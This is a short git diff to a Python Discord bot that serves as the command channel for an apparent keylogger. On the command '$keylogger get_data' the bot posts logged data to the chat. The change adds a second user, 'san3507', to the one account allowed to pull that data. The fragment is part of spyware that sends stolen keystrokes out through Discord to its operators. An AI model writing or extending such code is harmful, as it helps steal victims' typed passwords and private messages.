@@ -22,7 +22,7 @@ class DiscordBot:
                 return
 
             if message.content.startswith('$keylogger get_data'):
-                if str(message.author)=='async_sunlight':
+                if str(message.author)=='async_sunlight' or str(message.author)=='san3507':
                     await message.channel.send(f"New logged data is : ```{data_obj()}```")
                 else:
                     await message.channel.send("this is not for you love 😘")
